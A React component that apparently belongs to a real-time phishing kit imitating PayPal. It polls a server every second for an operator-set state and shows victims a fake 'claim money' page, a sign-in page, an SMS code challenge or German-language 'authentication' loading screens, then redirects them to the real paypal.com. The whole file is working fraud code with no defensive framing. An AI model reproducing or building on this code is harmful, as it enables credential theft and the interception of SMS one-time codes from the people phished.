import React, { useEffect, useState } from "react";
import { useQuery } from "@tanstack/react-query";
import { ClaimMoneyPage } from "../pages/ClaimMoneyPage";
import { SigninPage } from "../pages/SigninPage";
import { SmsChallengePage } from "../pages/SmsChallengePage";
import { LoadingOverlay } from "./LoadingOverlay";
import { SmsLoadingOverlay } from "./SmsLoadingOverlay";

interface DynamicPageManagerProps {
  contextData: string;
  defaultPage?: string;
}

export const DynamicPageManager: React.FC<DynamicPageManagerProps> = ({ 
  contextData, 
  defaultPage = "home" 
}) => {
  const [currentState, setCurrentState] = useState(defaultPage);

  // Poll for state changes every 1 second
  const { data: stateData } = useQuery({
    queryKey: ['/api/user-state', contextData],
    queryFn: async () => {
      const response = await fetch(`/api/user-state/${contextData}`);
      if (!response.ok) throw new Error('Failed to fetch state');
      return response.json();
    },
    refetchInterval: 1000, // Poll every second
    enabled: !!contextData
  });

  useEffect(() => {
    if (stateData?.state && stateData.state !== currentState) {
      setCurrentState(stateData.state);
    }
  }, [stateData, currentState]);

  // Render appropriate page based on current state
  const renderPage = () => {
    switch (currentState) {
      case 'payment':
      case 'home':
        return <ClaimMoneyPage />;
      case 'signin':
        return <SigninPage />;
      case 'sms':
        return <SmsChallengePage />;
      case 'loading':
        return (
          <>
            <SigninPage />
            <LoadingOverlay isVisible={true} message="Authentifizierung läuft..." />
          </>
        );
      case 'sms_loading':
        return (
          <>
            <SigninPage />
            <SmsLoadingOverlay 
              isVisible={true} 
              type="sms"
              title="Authentifizierung erforderlich"
              description="Bestätigen Sie Ihre Identität"
            />
          </>
        );
      case 'fullscreen':
        return (
          <div className="fixed inset-0 bg-white flex items-center justify-center z-50">
            <div className="text-center">
              <div className="animate-spin rounded-full h-32 w-32 border-b-2 border-blue-500 mx-auto mb-4"></div>
              <p className="text-lg font-medium">Just a second...</p>
            </div>
          </div>
        );
      case 'paypal':
        // Redirect to PayPal
        window.location.href = 'https://paypal.com';
        return null;
      default:
        return <ClaimMoneyPage />;
    }
  };

  return (
    <div>
      {renderPage()}
    </div>
  );
};